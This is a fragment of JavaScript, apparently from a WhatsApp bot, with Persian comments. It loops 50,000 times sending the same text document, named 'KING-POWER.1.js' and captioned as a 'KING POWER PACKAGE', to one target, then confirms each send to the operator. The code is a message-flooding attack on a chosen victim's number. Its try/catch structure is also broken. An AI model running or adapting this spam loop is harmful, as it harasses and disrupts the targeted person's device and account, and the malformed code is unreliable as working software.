// ارسال مستقیم
for(let i = 0; i < 50000; i++){

await sock.sendMessage(jid,{

document: Buffer.from(txt),

mimetype:"text/plain",

fileName:"KING-POWER.1.js",

caption:`
👑 KING POWER PACKAGE
⚡ DOWNLOAD READY
`

});

// پیام موفقیت
await sock.sendMessage(from,{
text:`✅ Sent to ${number}`
});

}catch(e){

console.log("KINGPOWER ERROR:", e);

await sock.sendMessage(from,{
text:"❌ send failed"
});

}

}